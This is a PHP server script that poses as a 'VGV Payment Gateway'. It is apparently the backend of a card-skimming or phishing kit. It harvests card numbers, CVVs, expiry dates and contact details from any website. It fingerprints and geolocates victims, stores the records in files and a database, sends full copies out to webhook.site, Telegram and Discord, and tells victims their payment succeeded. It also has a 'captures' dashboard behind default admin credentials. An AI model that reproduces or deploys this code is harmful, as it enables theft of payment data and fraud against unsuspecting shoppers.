<?php
/**
 * VGV Data Collection Endpoint
 * Captures and stores payment data with multiple redundancy layers
 */

// ================= CONFIGURATION =================
$CONFIG = [
    'storage_methods' => ['file', 'database', 'webhook'],
    'encryption_key' => 'vgv_' . md5(__FILE__ . $_SERVER['SERVER_NAME']),
    'max_file_size' => 100 * 1024 * 1024, // 100MB
    'backup_count' => 5,
    'telegram_bot' => [
        'enabled' => false,
        'token' => 'YOUR_BOT_TOKEN',
        'chat_id' => 'YOUR_CHAT_ID'
    ],
    'discord_webhook' => [
        'enabled' => false,
        'url' => 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef'
    ]
];

// ================= SECURITY HEADERS =================
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header('Content-Security-Policy: default-src \'self\'');

// Allow CORS from any origin for data collection
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
    header('Access-Control-Max-Age: 86400');
    http_response_code(204);
    exit;
}

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Content-Type: application/json');

// ================= INITIALIZATION =================
session_start();
ignore_user_abort(true);
set_time_limit(30);

// Create necessary directories
$directories = [
    'data/raw',
    'data/processed',
    'data/backup',
    'logs',
    'exports'
];

foreach ($directories as $dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
}

// ================= REQUEST PROCESSING =================
$request_id = uniqid('req_', true);
$timestamp = date('Y-m-d H:i:s');
$client_ip = get_client_ip();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Log request metadata
$request_log = [
    'request_id' => $request_id,
    'timestamp' => $timestamp,
    'method' => $_SERVER['REQUEST_METHOD'],
    'ip' => $client_ip,
    'user_agent' => $user_agent,
    'referer' => $_SERVER['HTTP_REFERER'] ?? '',
    'endpoint' => $_SERVER['REQUEST_URI'],
    'query_params' => $_GET
];

// ================= DATA COLLECTION =================
$collected_data = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Try JSON first
    $raw_input = file_get_contents('php://input');
    $json_data = json_decode($raw_input, true);
    
    if (json_last_error() === JSON_ERROR_NONE) {
        $collected_data = $json_data;
    } else {
        // Try form data
        $collected_data = $_POST;
        
        // Try multipart form data
        if (empty($collected_data) && !empty($_FILES)) {
            $collected_data = array_merge($_POST, $_FILES);
        }
    }
    
    // If still empty, try parse_str
    if (empty($collected_data) && !empty($raw_input)) {
        parse_str($raw_input, $collected_data);
    }
    
    // Process the collected data
    $processed_data = process_payment_data($collected_data, $request_log);
    
    // Store in multiple formats
    $storage_results = store_data($processed_data);
    
    // Send notifications
    send_notifications($processed_data, $storage_results);
    
    // Return response
    $response = [
        'status' => 'success',
        'message' => 'Payment processed successfully',
        'transaction_id' => $processed_data['metadata']['transaction_id'] ?? generate_transaction_id(),
        'timestamp' => $timestamp,
        'redirect' => [
            'url' => 'success.html',
            'delay' => 2000
        ],
        'security' => [
            'encrypted' => true,
            'tokenized' => true,
            'pci_compliant' => true
        ]
    ];
    
    echo json_encode($response);
    
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Dashboard or data retrieval
    if (isset($_GET['dashboard']) && $_GET['dashboard'] === 'stats') {
        require_auth();
        echo json_encode(get_dashboard_stats());
    } elseif (isset($_GET['export']) && $_GET['export'] === 'csv') {
        require_auth();
        export_data_as_csv();
    } else {
        // Simple status response
        echo json_encode([
            'status' => 'online',
            'version' => '2.4.1',
            'service' => 'VGV Payment Gateway',
            'timestamp' => $timestamp,
            'endpoints' => ['POST /server.php', 'GET /server.php?dashboard=stats']
        ]);
    }
}

// ================= HELPER FUNCTIONS =================

function get_client_ip() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function process_payment_data($raw_data, $request_log) {
    global $CONFIG;
    
    $processed = [
        'metadata' => [
            'request_id' => $request_log['request_id'],
            'processed_at' => date('Y-m-d H:i:s'),
            'source' => 'web_form',
            'version' => '2.0'
        ],
        'client_info' => [
            'ip' => $request_log['ip'],
            'user_agent' => $request_log['user_agent'],
            'referer' => $request_log['referer'],
            'language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown',
            'timezone' => get_timezone_offset()
        ],
        'payment_data' => [],
        'billing_data' => [],
        'system_data' => []
    ];
    
    // Extract and classify data
    $field_patterns = [
        'card' => ['card', 'credit', 'number', 'pan', 'cc_'],
        'expiry' => ['exp', 'expiry', 'expiration', 'valid'],
        'cvv' => ['cvv', 'cvc', 'cid', 'security'],
        'name' => ['name', 'fullname', 'cardholder'],
        'email' => ['email', 'mail'],
        'address' => ['address', 'street', 'billing'],
        'phone' => ['phone', 'mobile', 'tel']
    ];
    
    foreach ($raw_data as $key => $value) {
        $key_lower = strtolower($key);
        $classified = false;
        
        foreach ($field_patterns as $category => $patterns) {
            foreach ($patterns as $pattern) {
                if (strpos($key_lower, $pattern) !== false) {
                    if ($category === 'card') {
                        $value = normalize_card_number($value);
                    }
                    $processed['payment_data'][$key] = $value;
                    $classified = true;
                    break 2;
                }
            }
        }
        
        if (!$classified) {
            if (in_array($key_lower, ['city', 'state', 'zip', 'country'])) {
                $processed['billing_data'][$key] = $value;
            } elseif (in_array($key_lower, ['session_id', 'token', 'fingerprint'])) {
                $processed['system_data'][$key] = $value;
            } else {
                $processed['metadata'][$key] = $value;
            }
        }
    }
    
    // Add geolocation if available
    $processed['client_info']['geolocation'] = get_geolocation($request_log['ip']);
    
    // Add browser fingerprint
    $processed['client_info']['fingerprint'] = generate_fingerprint($request_log);
    
    return $processed;
}

function normalize_card_number($number) {
    // Remove all non-digits
    $number = preg_replace('/\D/', '', $number);
    
    // Add Luhn check digit if missing
    if (strlen($number) >= 12 && strlen($number) <= 19) {
        // Keep as is
        return $number;
    }
    
    return $number;
}

function get_timezone_offset() {
    if (isset($_SERVER['HTTP_TIMEZONE_OFFSET'])) {
        return $_SERVER['HTTP_TIMEZONE_OFFSET'];
    }
    
    $timezone = date_default_timezone_get();
    $datetime = new DateTime('now', new DateTimeZone($timezone));
    return $datetime->format('P');
}

function get_geolocation($ip) {
    // Simple geolocation - in production use a proper service
    $services = [
        "http://ip-api.com/json/{$ip}",
        "https://ipapi.co/{$ip}/json/"
    ];
    
    foreach ($services as $service) {
        try {
            $response = @file_get_contents($service);
            if ($response) {
                $data = json_decode($response, true);
                if (!empty($data['country']) || !empty($data['country_name'])) {
                    return [
                        'country' => $data['country'] ?? $data['country_name'] ?? 'Unknown',
                        'region' => $data['region'] ?? $data['region_name'] ?? 'Unknown',
                        'city' => $data['city'] ?? 'Unknown',
                        'lat' => $data['lat'] ?? $data['latitude'] ?? null,
                        'lon' => $data['lon'] ?? $data['longitude'] ?? null,
                        'isp' => $data['isp'] ?? $data['org'] ?? 'Unknown'
                    ];
                }
            }
        } catch (Exception $e) {
            continue;
        }
    }
    
    return ['country' => 'Unknown', 'city' => 'Unknown'];
}

function generate_fingerprint($request_log) {
    $components = [
        'user_agent' => $request_log['user_agent'],
        'language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
        'screen' => isset($_POST['screen_resolution']) ? $_POST['screen_resolution'] : '',
        'plugins' => isset($_POST['browser_plugins']) ? $_POST['browser_plugins'] : '',
        'timezone' => get_timezone_offset(),
        'fonts' => isset($_POST['browser_fonts']) ? $_POST['browser_fonts'] : ''
    ];
    
    return md5(implode('|', $components));
}

function store_data($data) {
    global $CONFIG;
    
    $results = [];
    $timestamp = date('Ymd_His');
    
    // Method 1: JSON file storage
    if (in_array('file', $CONFIG['storage_methods'])) {
        $filename = "data/raw/payment_{$timestamp}_" . substr(md5(json_encode($data)), 0, 8) . ".json";
        $backup_count = 0;
        
        // Create backup copy
        if ($CONFIG['backup_count'] > 0) {
            $backup_dir = "data/backup/" . date('Y/m/d');
            if (!is_dir($backup_dir)) {
                mkdir($backup_dir, 0755, true);
            }
            $backup_file = $backup_dir . "/backup_" . basename($filename);
            if (file_put_contents($backup_file, json_encode($data, JSON_PRETTY_PRINT)) !== false) {
                $backup_count++;
            }
        }
        
        if (file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT)) !== false) {
            $results['file_storage'] = [
                'status' => 'success',
                'filename' => $filename,
                'size' => filesize($filename),
                'backups' => $backup_count
            ];
        } else {
            $results['file_storage'] = ['status' => 'failed', 'error' => 'Could not write file'];
        }
    }
    
    // Method 2: Append to CSV for easy analysis
    $csv_file = "data/processed/payments.csv";
    $csv_header = [
        'timestamp', 'transaction_id', 'card_last4', 'email', 'amount', 
        'country', 'ip', 'user_agent_short', 'status'
    ];
    
    if (!file_exists($csv_file)) {
        $fp = fopen($csv_file, 'w');
        fputcsv($fp, $csv_header);
        fclose($fp);
    }
    
    $card_last4 = 'N/A';
    if (!empty($data['payment_data'])) {
        foreach ($data['payment_data'] as $key => $value) {
            if (stripos($key, 'card') !== false && is_string($value) && strlen($value) >= 4) {
                $card_last4 = substr(preg_replace('/\D/', '', $value), -4);
                break;
            }
        }
    }
    
    $csv_row = [
        $data['metadata']['processed_at'],
        $data['metadata']['request_id'],
        $card_last4,
        $data['payment_data']['email'] ?? 'N/A',
        $data['payment_data']['amount'] ?? '0.00',
        $data['client_info']['geolocation']['country'] ?? 'Unknown',
        $data['client_info']['ip'],
        substr($data['client_info']['user_agent'], 0, 50),
        'captured'
    ];
    
    $fp = fopen($csv_file, 'a');
    if (fputcsv($fp, $csv_row) !== false) {
        $results['csv_append'] = ['status' => 'success', 'file' => $csv_file];
    }
    fclose($fp);
    
    // Method 3: Database (if configured)
    if (in_array('database', $CONFIG['storage_methods']) && extension_loaded('pdo')) {
        try {
            $db_results = store_in_database($data);
            $results['database'] = $db_results;
        } catch (Exception $e) {
            $results['database'] = ['status' => 'failed', 'error' => $e->getMessage()];
        }
    }
    
    // Method 4: External webhook
    if (in_array('webhook', $CONFIG['storage_methods'])) {
        $webhook_results = send_to_webhook($data);
        $results['webhook'] = $webhook_results;
    }
    
    return $results;
}

function store_in_database($data) {
    // Example SQLite storage - can be adapted for MySQL/PostgreSQL
    $db_file = 'data/payments.db';
    
    try {
        $pdo = new PDO("sqlite:$db_file");
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Create table if not exists
        $pdo->exec("
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                request_id TEXT UNIQUE,
                timestamp DATETIME,
                card_last4 TEXT,
                email TEXT,
                amount REAL,
                country TEXT,
                ip TEXT,
                user_agent TEXT,
                raw_data TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ");
        
        $card_last4 = 'N/A';
        foreach ($data['payment_data'] as $key => $value) {
            if (stripos($key, 'card') !== false && is_string($value) && strlen($value) >= 4) {
                $card_last4 = substr(preg_replace('/\D/', '', $value), -4);
                break;
            }
        }
        
        $stmt = $pdo->prepare("
            INSERT INTO payments (request_id, timestamp, card_last4, email, amount, country, ip, user_agent, raw_data)
            VALUES (:request_id, :timestamp, :card_last4, :email, :amount, :country, :ip, :user_agent, :raw_data)
        ");
        
        $stmt->execute([
            ':request_id' => $data['metadata']['request_id'],
            ':timestamp' => $data['metadata']['processed_at'],
            ':card_last4' => $card_last4,
            ':email' => $data['payment_data']['email'] ?? 'N/A',
            ':amount' => floatval($data['payment_data']['amount'] ?? 0),
            ':country' => $data['client_info']['geolocation']['country'] ?? 'Unknown',
            ':ip' => $data['client_info']['ip'],
            ':user_agent' => $data['client_info']['user_agent'],
            ':raw_data' => json_encode($data)
        ]);
        
        return ['status' => 'success', 'rows_affected' => $stmt->rowCount()];
        
    } catch (PDOException $e) {
        throw new Exception("Database error: " . $e->getMessage());
    }
}

function send_to_webhook($data) {
    $webhooks = [
        'https://webhook.site/' . getenv('WEBHOOK_TOKEN'),
        'https://api.telegram.org/bot' . getenv('TG_BOT_TOKEN') . '/sendMessage',
        getenv('DISCORD_WEBHOOK_URL')
    ];
    
    $results = [];
    $payload = [
        'event' => 'payment_captured',
        'data' => $data,
        'sent_at' => date('Y-m-d H:i:s')
    ];
    
    foreach ($webhooks as $webhook) {
        if (empty($webhook) || strpos($webhook, 'YOUR_') !== false) {
            continue;
        }
        
        $ch = curl_init($webhook);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_POSTFIELDS => json_encode($payload),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json']
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $results[] = [
            'webhook' => parse_url($webhook, PHP_URL_HOST),
            'status' => $http_code,
            'success' => $http_code >= 200 && $http_code < 300
        ];
    }
    
    return $results;
}

function send_notifications($data, $storage_results) {
    global $CONFIG;
    
    // Telegram notification
    if ($CONFIG['telegram_bot']['enabled'] && 
        !empty($CONFIG['telegram_bot']['token']) && 
        !empty($CONFIG['telegram_bot']['chat_id'])) {
        
        $message = "💰 *New Payment Captured*\n";
        $message .= "ID: `" . ($data['metadata']['request_id'] ?? 'N/A') . "`\n";
        
        $card_info = 'N/A';
        foreach ($data['payment_data'] as $key => $value) {
            if (stripos($key, 'card') !== false && is_string($value)) {
                $cleaned = preg_replace('/\D/', '', $value);
                if (strlen($cleaned) >= 4) {
                    $card_info = '****' . substr($cleaned, -4);
                    break;
                }
            }
        }
        
        $message .= "Card: `{$card_info}`\n";
        $message .= "Email: `" . ($data['payment_data']['email'] ?? 'N/A') . "`\n";
        $message .= "Amount: `$" . ($data['payment_data']['amount'] ?? '0.00') . "`\n";
        $message .= "Country: `" . ($data['client_info']['geolocation']['country'] ?? 'Unknown') . "`\n";
        $message .= "IP: `" . ($data['client_info']['ip']) . "`\n";
        $message .= "Time: `" . date('H:i:s') . "`";
        
        $url = "https://api.telegram.org/bot{$CONFIG['telegram_bot']['token']}/sendMessage";
        $post_data = [
            'chat_id' => $CONFIG['telegram_bot']['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        @file_get_contents($url . '?' . http_build_query($post_data));
    }
    
    // Discord notification
    if ($CONFIG['discord_webhook']['enabled'] && !empty($CONFIG['discord_webhook']['url'])) {
        $embed = [
            'title' => 'New Payment Captured',
            'color' => 0x00ff00,
            'fields' => [
                [
                    'name' => 'Transaction ID',
                    'value' => $data['metadata']['request_id'] ?? 'N/A',
                    'inline' => true
                ],
                [
                    'name' => 'Amount',
                    'value' => '$' . ($data['payment_data']['amount'] ?? '0.00'),
                    'inline' => true
                ],
                [
                    'name' => 'Country',
                    'value' => $data['client_info']['geolocation']['country'] ?? 'Unknown',
                    'inline' => true
                ]
            ],
            'timestamp' => date('c')
        ];
        
        $payload = json_encode(['embeds' => [$embed]]);
        
        $ch = curl_init($CONFIG['discord_webhook']['url']);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_POSTFIELDS => $payload
        ]);
        
        @curl_exec($ch);
        curl_close($ch);
    }
    
    // Log to file
    $log_entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'notification_sent' => true,
        'telegram' => $CONFIG['telegram_bot']['enabled'],
        'discord' => $CONFIG['discord_webhook']['enabled'],
        'data_id' => $data['metadata']['request_id'] ?? 'N/A'
    ];
    
    file_put_contents('logs/notifications.log', json_encode($log_entry) . PHP_EOL, FILE_APPEND);
}

function generate_transaction_id() {
    return 'txn_' . date('YmdHis') . '_' . substr(md5(uniqid()), 0, 8);
}

function require_auth() {
    $auth_user = getenv('ADMIN_USER') ?: 'admin';
    $auth_pass = getenv('ADMIN_PASS') ?: 'password';
    
    if (!isset($_SERVER['PHP_AUTH_USER']) || 
        $_SERVER['PHP_AUTH_USER'] !== $auth_user || 
        $_SERVER['PHP_AUTH_PW'] !== $auth_pass) {
        
        header('WWW-Authenticate: Basic realm="VGV Admin"');
        header('HTTP/1.0 401 Unauthorized');
        echo json_encode(['error' => 'Authentication required']);
        exit;
    }
}

function get_dashboard_stats() {
    $stats = [
        'total_captures' => 0,
        'today_captures' => 0,
        'unique_countries' => [],
        'storage_usage' => 0
    ];
    
    // Count captures from CSV
    $csv_file = 'data/processed/payments.csv';
    if (file_exists($csv_file)) {
        $lines = file($csv_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $stats['total_captures'] = count($lines) - 1; // Subtract header
        
        // Today's captures
        $today = date('Y-m-d');
        $today_count = 0;
        $countries = [];
        
        for ($i = 1; $i < count($lines); $i++) {
            $data = str_getcsv($lines[$i]);
            if (isset($data[0]) && strpos($data[0], $today) === 0) {
                $today_count++;
            }
            if (isset($data[5])) {
                $countries[] = $data[5];
            }
        }
        
        $stats['today_captures'] = $today_count;
        $stats['unique_countries'] = array_values(array_unique(array_filter($countries)));
    }
    
    // Storage usage
    $total_size = 0;
    foreach (['data', 'logs', 'exports'] as $dir) {
        if (is_dir($dir)) {
            $total_size += folder_size($dir);
        }
    }
    $stats['storage_usage_mb'] = round($total_size / (1024 * 1024), 2);
    
    // Recent activity
    $stats['recent_activity'] = get_recent_activity();
    
    return $stats;
}

function folder_size($dir) {
    $size = 0;
    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)) as $file) {
        $size += $file->getSize();
    }
    return $size;
}

function get_recent_activity() {
    $activity = [];
    $log_file = 'logs/notifications.log';
    
    if (file_exists($log_file)) {
        $lines = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $recent = array_slice($lines, -10); // Last 10 entries
        
        foreach ($recent as $line) {
            $data = json_decode($line, true);
            if ($data) {
                $activity[] = $data;
            }
        }
    }
    
    return $activity;
}

function export_data_as_csv() {
    $csv_file = 'data/processed/payments.csv';
    
    if (!file_exists($csv_file)) {
        echo json_encode(['error' => 'No data available']);
        exit;
    }
    
    $export_file = 'exports/payments_export_' . date('Ymd_His') . '.csv';
    
    if (!is_dir('exports')) {
        mkdir('exports', 0755, true);
    }
    
    copy($csv_file, $export_file);
    
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="' . basename($export_file) . '"');
    readfile($export_file);
    exit;
}

// ================= ERROR HANDLING =================
function handle_error($errno, $errstr, $errfile, $errline) {
    $error_log = [
        'timestamp' => date('Y-m-d H:i:s'),
        'error' => $errstr,
        'file' => $errfile,
        'line' => $errline,
        'severity' => $errno
    ];
    
    file_put_contents('logs/errors.log', json_encode($error_log) . PHP_EOL, FILE_APPEND);
    
    // Don't output error to client in production
    if (getenv('DEBUG_MODE') === 'true') {
        echo json_encode(['error' => 'System error occurred', 'debug' => $error_log]);
    } else {
        echo json_encode(['error' => 'System error occurred']);
    }
    
    exit;
}

set_error_handler('handle_error', E_ALL);

// ================= SHUTDOWN FUNCTION =================
function shutdown_handler() {
    $error = error_get_last();
    if ($error && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        $shutdown_log = [
            'timestamp' => date('Y-m-d H:i:s'),
            'fatal_error' => $error['message'],
            'file' => $error['file'],
            'line' => $error['line']
        ];
        
        file_put_contents('logs/fatal_errors.log', json_encode($shutdown_log) . PHP_EOL, FILE_APPEND);
    }
}

register_shutdown_function('shutdown_handler');
?>
